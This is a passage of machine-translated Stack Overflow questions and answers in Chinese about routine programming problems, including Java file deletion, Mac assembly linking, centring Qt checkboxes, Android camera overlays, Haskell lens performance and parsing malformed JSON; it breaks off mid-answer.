> 时间：2013-02-13T06:40:31.570
> 
> 标签：java, file

```
String book_name = book_list.getModel().getElementAt(book_list.getSelectedIndex()).toString();
System.out.println("File name : "+book_name);

File f = new File("C:\\Users\\Surya\\Documents\\NetBeansProjects\\New_Doodle\\Library\\"+book_name);
System.out.println("Path:"+f.getAbsolutePath());

if(f.exists())
    System.out.println("Book Exists");
else
    System.out.println("Not Exixts");

if(f.isFile())
{
    System.out.println("It is File");
}
else
    System.out.println("It is Directory");

System.out.println(f.isAbsolute());

if (f.delete())
{
    JOptionPane.showMessageDialog(null, "Book Deleted");
}
else
{
    JOptionPane.showMessageDialog(null, "Operation Failed");
} 
```

## 输出

```
File name : `Twilight03-Eclipse.pdf`  
Path: `C:\Users\Surya\Documents\NetBeansProjects\New_Doodle\Library\Twilight03-Eclipse.pdf`  
Book Exists  
It is File  
true  
Operation Failed (dialog box)  
File is not deleted 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:51:40.777

删除可能由于一个或多个原因而失败：

*   文件不存在（使用 File#exists() 进行测试）。
*   文件被锁定（因为它是由另一个应用程序（或您自己的代码！）打开的。）
*   你没有被授权（但这会抛出一个 SecurityException，而不是返回 false！）。

此功能可以帮助：

```
public String getReasonForFileDeletionFailureInPlainEnglish(File file) {
    try {
        if (!file.exists())
            return "It doesn't exist in the first place.";
        else if (file.isDirectory() && file.list().length > 0)
            return "It's a directory and it's not empty.";
        else
            return "Somebody else has it open, we don't have write permissions, or somebody stole my disk.";
    } catch (SecurityException e) {
        return "We're sandboxed and don't have filesystem access.";
    }
} 
```

[如何判断为什么在 Java 中文件删除失败？](https://stackoverflow.com/questions/1729049/how-to-tell-why-a-file-deletion-fails-in-java)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:51:01.973

使用[java.nio.file](http://docs.oracle.com/javase/7/docs/api/java/nio/file/package-summary.html)包找出删除操作失败的原因。它为您提供了相同的详细原因。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-25T10:37:42.753

```
public class Example {
    public static void main(String[] args) {
         try{
             File file = new File("C:/ProgramData/Logs/" + selectedJLItem);

             if(file.delete()){
                 System.out.println(file.getName() + " Was deleted!");
             }else{
                 System.out.println("Delete Operation Failed. Check: " + file);
             }
         }catch(Exception e1){
             e1.printStackTrace();
         }
    }
} 
```

# audio - 开源编解码器以减少/最小化背景噪声或进行回声消除？

> ID：14847916
> 
> 赞同：1
> 
> 时间：2013-02-13T06:40:50.567
> 
> 标签：audio, audio-streaming, codec, echo-cancellation

这与我们的[另一个问题](https://stackoverflow.com/questions/14845564/is-it-possible-to-reduce-background-noise-while-streaming-audio-on-the-iphone)有关。

是否有任何可以减少/消除背景噪音的开源编解码器？

一般来说，最可靠或最流行的回声消除编解码器是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-30T14:33:13.610

[Speex](https://www.speex.org/)（一个免费和开源的编解码器）有一个提供回声消除的 DSP 库，请参阅[SpeexEchoState：Acoustic Echo Canceller](http://www.speex.org/docs/api/speex-api-reference/group__SpeexEchoState.html) (AEC)。它可以与编解码器分开使用。

还有带有AEC代码[的WebRTC ；](https://bugs.chromium.org/p/webrtc/issues/list)该代码库在 PulseAudio 中用于提供回声消除

# macos - GCC运行汇编程序mac？

> ID：14847917
> 
> 赞同：3
> 
> 时间：2013-02-13T06:41:00.757
> 
> 标签：macos, gcc, assembly, terminal

我正在尝试在我的 Mac 上的终端中运行以下代码：

```
.section, .data

format_string:
   .asciz "My favorite number is %d!"

number:
  .long 786

.section, .text
.globl main

main:
  pushl number
 pushl $format_string  
 call printf 
  addl $8, %esp

  pushl $0
  call exit 
```

此代码位于名为 favorite.s 的文件中

我使用命令“gcc favorite.s -m32”并看到以下消息：

```
Undefined symbols for architecture i386:
  "_main", referenced from:
      start in crt1.10.6.o
  "exit", referenced from:
      main in ccUKdD8O.o
  "printf", referenced from:
      main in ccUKdD8O.o
ld: symbol(s) not found for architecture i386
collect2: ld returned 1 exit status 
```

我在这里做错了什么？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T06:44:34.337

在 Mac OS X 上，符号前有一个下划线。在您的程序中添加一个`_`, `main`,`exit`和`printf`，然后再试一次！

# c# - 获取打开网站对话框

> ID：14847918
> 
> 赞同：1
> 
> 时间：2013-02-13T06:41:15.650
> 
> 标签：c#

我的 c# 应用程序需要在**IIS**上运行的本地网站的**URL**。我想要一个对话框，提示用户提供可用的本地网站，如 VS have（下图）。

 **`FolderBrowserDialog`有没有办法在 c# 中得到这样的结果。

![在此处输入图像描述](../Images/39d986b24ca8a530de5ddbc3a1706fde.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:47:19.527

为此，您必须制作一个自定义对话框，这并不难，首先使用`System.DirectoryServices`命名空间获取 IIS 目录中的网站列表。依此类推...

有关更多信息，请查看[C# - IIS：列出网站](http://cstruter.com/blog/306)**

# java - 当 Gps 关闭时，未在 MyLocationOverlay 中调用 OnLocationChanged 方法

> ID：14847919
> 
> 赞同：0
> 
> 时间：2013-02-13T06:41:18.260
> 
> 标签：java, android, gps, provider, mylocationoverlay

在文档中它说 mylocationoverlay onlocationchanged 方法在定义 ACCESS_FINE_LOCATION 权限时同时使用 gps 和网络提供商。当 Gps 开启时一切都很好，onlocationchanged 工作，但是当我关闭 gps onlocationchanged 时从未调用过。我的课有什么问题吗？我必须实现 locationlistener 或 locationmanager 吗？

```
import android.content.Context;
import android.location.Location;
import com.google.android.maps.GeoPoint;
import com.google.android.maps.MapView;
import com.google.android.maps.MyLocationOverlay;
import com.google.android.maps.Overlay;

public class FLOverlay extends MyLocationOverlay {

public FLOverlay(Context context, MapView mapView) {
    super(context, mapView);

    enableCompass();
    enableMyLocation();
}

@Override           
public synchronized void onLocationChanged(Location location) {

     /***/
}

@Override
public boolean onTap(GeoPoint p, MapView map) {

            /***/

}

} 
```

# android - 从反射执行其他应用程序方法

> ID：14847922
> 
> 赞同：1
> 
> 时间：2013-02-13T06:41:35.490
> 
> 标签：android

我有一个应用程序 A，并将**其安装到 device**。

```
public class A1 extends Activity {
    void onCreate() ...
    void onResume() ...
    void showToast() {
        Toast.makeText(this, "showA1", Toast.LENGTH_SHORT).show();
    }
} 
```

**我写了另一个应用程序 B，想执行 A1.showToast()**，但在 A1.showToast() 遇到 NullPointerException。

```
@SuppressWarnings("unchecked")
@Override
public void onClick(View v) {
    String packagePath = "A";
    String classPath = "A.A1";

    try {
        String apkName = getPackageManager().getApplicationInfo(
                packagePath, 0).sourceDir;
        PathClassLoader pathClassLoader = new PathClassLoader(apkName,
                ClassLoader.getSystemClassLoader());
        Class<Activity> handler = (Class<Activity>) Class.forName(
                classPath, true, pathClassLoader);
        Method[] mm = handler.getDeclaredMethods();

        for (Method m : mm) {
            Log.d("Method", m.getName());
        }

        Method method = handler.getDeclaredMethod("showToast",
                (Class[]) null);

        method.setAccessible(true);
        method.invoke(handler.newInstance(), (Object[]) null);
    } catch (Exception e) {
        e.printStackTrace();
    }
} 
```

我知道 A1 没有初始化，所以“this”为空。有人可以帮我解决这个问题吗？

# c++ - Qt - 在 QTable 中将复选框居中

> ID：14847928
> 
> 赞同：10
> 
> 时间：2013-02-13T06:42:12.657
> 
> 标签：c++, qt, qt-creator, qtablewidgetitem, qcheckbox

在 QtCreater 中，我向我的项目添加了一个表。在我的代码中，我正在生成一些数据以输出到表中。我想在`QCheckbox`每一行中添加一个以允许选择该行。表格的所有内容都左对齐，如何仅使每行第一列中的这些复选框与中心对齐？

我正在添加`QCheckbox`使用：

```
ui->data_table->setCellWidget(rowCount,0, new QCheckBox); 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2014-10-21T21:20:59.823

为巴里·马文竖起两个大拇指！你甚至不必子类化。

一条线...

```
pCheckBox->setStyleSheet("margin-left:50%; margin-right:50%;"); 
```

完毕！！

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-02-13T07:56:29.923

我通常为此使用布局和容器小部件。这是一个丑陋的解决方案，但它有效：

```
QWidget * w = new QWidget();
QHBoxLayout *l = new QHBoxLayout();
l->setAlignment( Qt::AlignCenter );
l->addWidget( <add your checkbox here> );
w->setLayout( l );
ui->data_table->setCellWidget(rowCount,0, w); 
```

所以基本上你将拥有：

```
Table Cell -> Widget -> Layout -> Checkbox 
```

如果您需要通过表格访问复选框，则必须考虑它。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-02-24T06:48:34.423

这是一篇旧文章，但实际上有一种更简单、更轻松的方法来实现这一点，只需子类化`QCheckBox`并将其设置`stylesheet`为

```
margin-left:50%;
margin-right:50%; 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-08-27T15:49:29.457

它对我有用，但我的复选框没有完全显示。

要获得小部件的完整视图，请删除 layout 中的边距：

l->setContentsMargins(0,0,0,0);

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-11-21T18:17:46.843

正如有关 Stack Overflow 的类似问题所述，它目前是一个开放的 BUG：

[https://bugreports.qt-project.org/browse/QTBUG-5368](https://bugreports.qt-project.org/browse/QTBUG-5368)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-12-31T05:48:05.793

如果想添加更多自定义，也可以使用布局像这样居中

```
// Create a widget that will contain a checkbox
 QWidget *checkBoxWidget = new QWidget();
 QCheckBox *checkBox = new QCheckBox();      // We declare and initialize the checkbox
 QHBoxLayout *layoutCheckBox = new QHBoxLayout(checkBoxWidget); // create a layer with reference to the widget
 layoutCheckBox->addWidget(checkBox);            // Set the checkbox in the layer
 layoutCheckBox->setAlignment(Qt::AlignCenter);  // Center the checkbox
 layoutCheckBox->setContentsMargins(0,0,0,0);    // Set the zero padding

ui->my_table_view->setCellWidget(row_number,column_number, checkBoxWidget);  // set cell widget 
```

或者简单地添加左右边距

```
checkBox->setStyleSheet("margin-left:50%; margin-right:50%;"); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-05-20T05:07:39.313

```
#if QT_VERSION < 0x046000
#include <QCommonStyle>
class MyStyle : public QCommonStyle {
public:
  QRect subElementRect(SubElement subElement, const QStyleOption *option, const QWidget *widget = 0) const {
    switch(subElement) {
      case QStyle::SE_CheckBoxIndicator: {
        QRect r = QCommonStyle::subElementRect(subElement, option, widget);
        r.setRect( (widget->width() - r.width())/2, r.top(), r.width(), r.height());
        return QRect(r);
      }
      default: return QCommonStyle::subElementRect(subElement, option, widget);
    }
  }
};
#else
#include <QProxyStyle>
#include <QStyleFactory>
class MyStyle: public QProxyStyle {
public:
  MyStyle():QProxyStyle(QStyleFactory::create("Fusion")) {}
  QRect subElementRect(SubElement subElement, const QStyleOption *option, const QWidget *widget = 0) const {
    switch(subElement) {
      case QStyle::SE_CheckBoxIndicator: {
        QRect r = QProxyStyle::subElementRect(subElement, option, widget);
        r.setRect( (widget->width() - r.width())/2, r.top(), r.width(), r.height());
        return QRect(r);
      }
      default: return QProxyStyle::subElementRect(subElement, option, widget);
    }
  }
};
#endif

QCheckBox *box = new QCheckBox();
box->setStyle(new MyStyle()); 
```

# mysql - 从 csv 加载数据时如何忽略/跳过 LOAD DATA INFILE 中的无效数据行。

> ID：14847930
> 
> 赞同：1
> 
> 时间：2013-02-13T06:42:18.960
> 
> 标签：mysql, load-data-infile

我正在尝试从 CSV 文件加载数据，CSV 中的少数日期字段列数据无效。但是当我运行 LOAD DATA INFILE 语句时，它会在这些列中插入 NULL 值。如何跳过包含无效数据的整行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:49:11.013

如果您在文件功能中使用加载，则不能跳过这些行。做一件事，首先将所有数据加载到临时表中，然后从该表中仅将有效行拉到临时表中。一旦您将所有行插入临时表，请删除该临时表！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-28T16:45:43.000

`NOT NULL`您可以在创建表时通过在日期列上使用 a 来跳过无效的空日期。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-22T09:10:55.157

当您通过 csv 文件加载数据时。日期应为 yyyy-mm--dd HH:MM:SS 格式。否则它会插入 NULL 值。在 csv 文件中选择日期整列并右键单击它。单击格式单元格并选择右侧的“日期”列，然后选择“自定义”。然后您可以看到格式 'yyyy/mm/dd' 将其更改为 'yyyy-mm--dd HH:MM:SS' 。使用 csv 文件左上角的格式刷对所有日期列执行相同操作。我猜这应该可以解决你的问题。

# performance - Control.Lens 是否有性能开销？

> ID：14847934
> 
> 赞同：8
> 
> 时间：2013-02-13T06:42:33.733
> 
> 标签：performance, haskell, lenses

我很欣赏 Control.Lens 包。它确实有助于稍微弱一点的 Haskell 记录语法。我正在研究库的某些部分，其中性能是一个问题。有谁知道与函数中的基本模式匹配相比，使用通过如下所示的类型类公开的简单镜头会产生什么性能损失（如果有的话）？像这样使用 Lenses 有可能很好地解决记录命名空间冲突问题。我可以自己设置一些基准，但很好奇是否有人可以为我省去麻烦。谢谢。

## 镜头类

```
class LensX v where
  _x :: Functor f => (Double -> f Double) -> v -> f v

class LensY v where
  _y :: Functor f => (Double -> f Double) -> v -> f v

class LensZ v where
  _z :: Functor f => (Double -> f Double) -> v -> f v 
```

## 镜头实例

```
instance LensX Vec3 where
  _x f (Vec3 x y z) = fmap (\x' -> Vec3 x' y z) (f x)

instance LensY Vec3 where
  _y f (Vec3 x y z) = fmap (\y' -> Vec3 x y' z) (f y)

instance LensZ Vec3 where
  _z f (Vec3 x y z) = fmap (\z' -> Vec3 x y z') (f z) 
```

提供 Lenses 的模块不必导入 Control.Lens 包，非常棒。[此页面https://github.com/ekmett/lens/](https://github.com/ekmett/lens/)描述了该库的使用。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-13T07:58:43.443

您为这种类型的镜头支付了少量的性能损失。它来自所有具有导致字典传递发生的约束的更高级别的类型。

这是您想回到[data-lens](http://hackage.haskell.org/package/data-lens)的罕见情况之一，它没有这个问题，甚至可以使您的代码*更快*。Data-lens，如果你解码`Store`comonad间接，使用你可以对一个镜头最直接的表示：

```
newtype Lens s a = Lens (s -> (a, a -> s)) 
```

虽然该库本身不支持多态镜头，但您可以构建自己的镜头类型，并且仍然可以为您提供高性能：

```
newtype Lens s t a b = Lens (s -> (a, b -> t)) 
```

对于您的特定目的，您可能还对[线性](http://hackage.haskell.org/package/linear)包感兴趣。

# android - 在android相机界面上添加一个虚线圆圈

> ID：14847936
> 
> 赞同：2
> 
> 时间：2013-02-13T06:42:37.213
> 
> 标签：android, android-camera, android-canvas

我正在开发一个人脸识别应用程序。我需要在我的相机界面上显示一个小虚线圆圈来放置人的脸，以便用户可以训练应用程序而不是使用不同比例的照片。我关注了[“此链接”](https://stackoverflow.com/questions/4406356/how-to-draw-a-dotted-circle-in-android-sdk)，但我不知道如何在相机界面上进行操作。那么任何人都可以上传一个示例项目或给我一些东西来继续我的项目吗？提前致谢..

Edit-2013-02-14
好的，代码正在运行。但我又遇到了两个问题。

1.  我可以画圆。但它总是不在同一个位置。当屏幕尺寸发生变化时，它的位置总是在变化。我尝试使用 getWidht() 和 getHeight() 方法，但无法在屏幕中心绘制圆圈。您对此有任何想法吗？

2.  根据您的回答，我必须以编程方式创建所有视图。所以现在我需要在我的界面中添加一个捕获按钮。你能用你的答案解释一下吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T08:10:50.943

编辑 ：

编辑代码以在中心绘制圆圈并在表面视图上添加捕获图像按钮。

```
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.DashPathEffect;
import android.graphics.Paint;
import android.graphics.Paint.Style;
import android.graphics.Point;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Display;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.view.Window;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.Toast;

public class TestActivity extends Activity { 
    /** Called when the activity is first created. */ 

    Camera mCamera = null; 
    @Override 
    public void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState); 
        requestWindowFeature(Window.FEATURE_NO_TITLE); 
        setContentView(R.layout.camera_layout); 
        mCamera = getCameraInstance();
        Preview mPreview = new Preview(this, mCamera); 
        FrameLayout preview = (FrameLayout) findViewById(R.id.camera_preview);
        preview.addView(mPreview);
        Display display = getWindowManager().getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        int screenCenterX = (size.x /2);
        int screenCenterY = (size.y/2) ;
        DrawOnTop mDraw = new DrawOnTop(this,screenCenterX,screenCenterY); 
        addContentView(mDraw, new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT)); 

        //Adding listener
        Button captureButton = (Button) findViewById(R.id.button_capture);
        captureButton.setOnClickListener(
                new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    mCamera.takePicture(null, null, mPicture);

                }
            });
    } 
    /**
     * Helper method to access the camera returns null if
     * it cannot get the camera or does not exist
     * @return
     */
    private Camera getCameraInstance() {
        Camera camera = null;

        try {
            camera = Camera.open();
        } catch (Exception e) {
            // cannot get camera or does not exist
        }
        return camera;
    }
    PictureCallback mPicture = new PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
             File pictureFile = getOutputMediaFile();
                if (pictureFile == null){
                    return;
                }
                try {
                    FileOutputStream fos = new FileOutputStream(pictureFile);
                    fos.write(data);
                    fos.close();
                    Toast.makeText(TestActivity.this, "Photo saved to folder \"Pictures\\MyCameraApp\"", Toast.LENGTH_SHORT).show();
                } catch (FileNotFoundException e) {

                } catch (IOException e) {

                }
        }
    };

    private static File getOutputMediaFile(){
        File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
                  Environment.DIRECTORY_PICTURES), "MyCameraApp");
        if (! mediaStorageDir.exists()){
            if (! mediaStorageDir.mkdirs()){
                Log.d("MyCameraApp", "failed to create directory");
                return null;
            }
        }
        // Create a media file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
            "IMG_"+ timeStamp + ".jpg");

        return mediaFile;
    }
} 

class DrawOnTop extends View { 
    int screenCenterX = 0;
    int screenCenterY = 0;
    final int radius = 50;
        public DrawOnTop(Context context, int screenCenterX, int screenCenterY) { 
                super(context); 
               this.screenCenterX = screenCenterX;
               this.screenCenterY = screenCenterY;
         } 

        @Override 
        protected void onDraw(Canvas canvas) { 
                // TODO Auto-generated method stub 
             Paint p = new Paint();
             p.setColor(Color.RED);
             DashPathEffect dashPath = new DashPathEffect(new float[]{5,5}, (float)1.0);
             p.setPathEffect(dashPath);
             p.setStyle(Style.STROKE);
             canvas.drawCircle(screenCenterX, screenCenterY, radius, p);
             invalidate();
             super.onDraw(canvas); 
        } 
    } 

//---------------------------------------------------------------------- 

class Preview extends SurfaceView implements SurfaceHolder.Callback { 
    SurfaceHolder mHolder; 
    Camera mCamera; 
    Preview(Context context, Camera camera) { 
        super(context); 
        // Install a SurfaceHolder.Callback so we get notified when 
        this.mCamera = camera;
        // underlying surface is created and destroyed. 
        mHolder = getHolder(); 
        mHolder.addCallback(this); 
      //this is a deprecated method, is not required after 3.0
        mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS); 
    } 

    public void surfaceCreated(SurfaceHolder holder) { 
        // The Surface has been created, acquire the camera and tell 
        // to draw. 
        try {
            mCamera.setPreviewDisplay(holder);
            mCamera.startPreview();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } 
    } 

    public void surfaceDestroyed(SurfaceHolder holder) { 
        // Surface will be destroyed when we return, so stop the 
        // Because the CameraDevice object is not a shared resource, 
        // important to release it when the activity is paused. 
        mCamera.stopPreview(); 
        mCamera.release();
        mCamera = null; 
    } 

    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) { 
        // Now that the size is known, set up the camera parameters 
        // the preview. 
        Camera.Parameters parameters = mCamera.getParameters();
        List<Camera.Size> previewSizes = parameters.getSupportedPreviewSizes();
        // You need to choose the most appropriate previewSize for your app
        Camera.Size previewSize = previewSizes.get(0);
        parameters.setPreviewSize(previewSize.width, previewSize.height);
        mCamera.setParameters(parameters);
        mCamera.startPreview();
    }

} 
```

camera_layout.xml

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    >
  <FrameLayout
    android:id="@+id/camera_preview"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_weight="1"
    />

  <Button
    android:id="@+id/button_capture"
    android:text="Capture"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_gravity="center"
    />
</LinearLayout> 
```

不要忘记添加权限：

```
<uses-permission android:name="android.permission.CAMERA" />
 <uses-feature android:name="android.hardware.camera" /> 
```

新增权限：

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

# php - Ajax：如何循环通过巨大的 JSON 数据

> ID：14847937
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:42:41.657
> 
> 标签：php, json

我在 ajax 响应中收到以下 Json 数据...我不知道如何遍历它我想遍历它并从中制作一个数组，我将在 HTML DOM 中使用它也我想缓存这个数据如果数据已经可用，则不再有 Ajax 请求...

我该怎么做，我试过用 $.each(data, function(key,value){ ---- }) 来做。但问题是循环数据我想放一个for循环，在里面我想填充一些其他数组或对象......

这有意义吗，我们可以这样做吗？

```
{"CountryCode":"ABW","Language":"Dutch"}{"CountryCode":"ABW","Language":"English"}{"CountryCode":"ABW","Language":"Papiamento"}{"CountryCode":"ABW","Language":"Spanish"}{"CountryCode":"AFG","Language":"Balochi"}{"CountryCode":"AFG","Language":"Dari"}{"CountryCode":"AFG","Language":"Pashto"}{"CountryCode":"AFG","Language":"Turkmenian"}{"CountryCode":"AFG","Language":"Uzbek"}{"CountryCode":"AGO","Language":"Ambo"}{"CountryCode":"AGO","Language":"Chokwe"}{"CountryCode":"AGO","Language":"Kongo"}{"CountryCode":"AGO","Language":"Luchazi"}{"CountryCode":"AGO","Language":"Luimbe-nganguela"}{"CountryCode":"AGO","Language":"Luvale"}{"CountryCode":"AGO","Language":"Mbundu"}{"CountryCode":"AGO","Language":"Nyaneka-nkhumbi"}{"CountryCode":"AGO","Language":"Ovimbundu"}{"CountryCode":"AIA","Language":"English"}{"CountryCode":"ALB","Language":"Albaniana"}{"CountryCode":"ALB","Language":"Greek"}{"CountryCode":"ALB","Language":"Macedonian"}{"CountryCode":"AND","Language":"Catalan"}{"CountryCode":"AND","Language":"French"}{"CountryCode":"AND","Language":"Portuguese"}{"CountryCode":"AND","Language":"Spanish"}{"CountryCode":"ANT","Language":"Dutch"}{"CountryCode":"ANT","Language":"English"}{"CountryCode":"ANT","Language":"Papiamento"}{"CountryCode":"ARE","Language":"Arabic"}{"CountryCode":"ARE","Language":"Hindi"}{"CountryCode":"ARG","Language":"Indian Languages"}{"CountryCode":"ARG","Language":"Italian"}{"CountryCode":"ARG","Language":"Spanish"}{"CountryCode":"ARM","Language":"Armenian"}{"CountryCode":"ARM","Language":"Azerbaijani"}{"CountryCode":"ASM","Language":"English"}{"CountryCode":"ASM","Language":"Samoan"}{"CountryCode":"ASM","Language":"Tongan"}{"CountryCode":"ATG","Language":"Creole English"}{"CountryCode":"ATG","Language":"English"}{"CountryCode":"AUS","Language":"Arabic"}{"CountryCode":"AUS","Language":"Canton Chinese"}{"CountryCode":"AUS","Language":"English"}{"CountryCode":"AUS","Language":"German"}{"CountryCode":"AUS","Language":"Greek"}{"CountryCode":"AUS","Language":"Italian"}{"CountryCode":"AUS","Language":"Serbo-Croatian"}{"CountryCode":"AUS","Language":"Vietnamese"}{"CountryCode":"AUT","Language":"Czech"}{"CountryCode":"AUT","Language":"German"}{"CountryCode":"AUT","Language":"Hungarian"}{"CountryCode":"AUT","Language":"Polish"}{"CountryCode":"AUT","Language":"Romanian"}{"CountryCode":"AUT","Language":"Serbo-Croatian"}{"CountryCode":"AUT","Language":"Slovene"}{"CountryCode":"AUT","Language":"Turkish"}{"CountryCode":"AZE","Language":"Armenian"}{"CountryCode":"AZE","Language":"Azerbaijani"}{"CountryCode":"AZE","Language":"Lezgian"}{"CountryCode":"AZE","Language":"Russian"}{"CountryCode":"BDI","Language":"French"}{"CountryCode":"BDI","Language":"Kirundi"}{"CountryCode":"BDI","Language":"Swahili"}{"CountryCode":"BEL","Language":"Arabic"}{"CountryCode":"BEL","Language":"Dutch"}{"CountryCode":"BEL","Language":"French"}{"CountryCode":"BEL","Language":"German"}{"CountryCode":"BEL","Language":"Italian"}{"CountryCode":"BEL","Language":"Turkish"}{"CountryCode":"BEN","Language":"Adja"}{"CountryCode":"BEN","Language":"Aizo"} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:50:08.133

您的问题可以分两步解决：

1）将您的 json 数据转换为 php 字符串 2）迭代该数组：

步骤 1) 转换为数组

```
$arr = json_decode($jsondata); 
```

步骤 2) 遍历数组

```
arrayRecurssive($arr);

function arrayRecurssive($arr){

    foreach($arr as $key=>$val){
        if(is_array($val)){
            echo "$key\n";
            arrayRecurssive($val);
        }else{
           echo "$key\n";
           echo "$val\n";
        }

    }
} 
```

在我上面的示例中，我使用 '\n' 作为我的新行，但也可能是`<br/>`. 输出的进一步格式化留给编码器作为练习:-)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:50:52.780

json 数据似乎格式错误。它应该是：

```
[{"CountryCode":"ABW","Language":"Dutch"},{"CountryCode":"ABW","Language":"English"},{"CountryCode":"ABW","Language":"Papiamento"},{"CountryCode":"ABW","Language":"Spanish"},{"CountryCode":"AFG","Language":"Balochi"},{"CountryCode":"AFG","Language":"Dari"},{"CountryCode":"AFG","Language":"Pashto"},{"CountryCode":"AFG","Language":"Turkmenian"},{"CountryCode":"AFG","Language":"Uzbek"},{"CountryCode":"AGO","Language":"Ambo"},{"CountryCode":"AGO","Language":"Chokwe"},{"CountryCode":"AGO","Language":"Kongo"},{"CountryCode":"AGO","Language":"Luchazi"},{"CountryCode":"AGO","Language":"Luimbe-nganguela"},{"CountryCode":"AGO","Language":"Luvale"},{"CountryCode":"AGO","Language":"Mbundu"},{"CountryCode":"AGO","Language":"Nyaneka-nkhumbi"},{"CountryCode":"AGO","Language":"Ovimbundu"},{"CountryCode":"AIA","Language":"English"},{"CountryCode":"ALB","Language":"Albaniana"},{"CountryCode":"ALB","Language":"Greek"},{"CountryCode":"ALB","Language":"Macedonian"},{"CountryCode":"AND","Language":"Catalan"},{"CountryCode":"AND","Language":"French"},{"CountryCode":"AND","Language":"Portuguese"},{"CountryCode":"AND","Language":"Spanish"},{"CountryCode":"ANT","Language":"Dutch"},{"CountryCode":"ANT","Language":"English"},{"CountryCode":"ANT","Language":"Papiamento"},{"CountryCode":"ARE","Language":"Arabic"},{"CountryCode":"ARE","Language":"Hindi"},{"CountryCode":"ARG","Language":"Indian Languages"},{"CountryCode":"ARG","Language":"Italian"},{"CountryCode":"ARG","Language":"Spanish"},{"CountryCode":"ARM","Language":"Armenian"},{"CountryCode":"ARM","Language":"Azerbaijani"},{"CountryCode":"ASM","Language":"English"},{"CountryCode":"ASM","Language":"Samoan"},{"CountryCode":"ASM","Language":"Tongan"},{"CountryCode":"ATG","Language":"Creole English"},{"CountryCode":"ATG","Language":"English"},{"CountryCode":"AUS","Language":"Arabic"},{"CountryCode":"AUS","Language":"Canton Chinese"},{"CountryCode":"AUS","Language":"English"},{"CountryCode":"AUS","Language":"German"},{"CountryCode":"AUS","Language":"Greek"},{"CountryCode":"AUS","Language":"Italian"},{"CountryCode":"AUS","Language":"Serbo-Croatian"},{"CountryCode":"AUS","Language":"Vietnamese"},{"CountryCode":"AUT","Language":"Czech"},{"CountryCode":"AUT","Language":"German"},{"CountryCode":"AUT","Language":"Hungarian"},{"CountryCode":"AUT","Language":"Polish"},{"CountryCode":"AUT","Language":"Romanian"},{"CountryCode":"AUT","Language":"Serbo-Croatian"},{"CountryCode":"AUT","Language":"Slovene"},{"CountryCode":"AUT","Language":"Turkish"},{"CountryCode":"AZE","Language":"Armenian"},{"CountryCode":"AZE","Language":"Azerbaijani"},{"CountryCode":"AZE","Language":"Lezgian"},{"CountryCode":"AZE","Language":"Russian"},{"CountryCode":"BDI","Language":"French"},{"CountryCode":"BDI","Language":"Kirundi"},{"CountryCode":"BDI","Language":"Swahili"},{"CountryCode":"BEL","Language":"Arabic"},{"CountryCode":"BEL","Language":"Dutch"},{"CountryCode":"BEL","Language":"French"},{"CountryCode":"BEL","Language":"German"},{"CountryCode":"BEL","Language":"Italian"},{"CountryCode":"BEL","Language":"Turkish"},{"CountryCode":"BEN","Language":"Adja"},{"CountryCode":"BEN","Language":"Aizo"}] 
```

然后，您可以简单地将其分配给数组。例如：

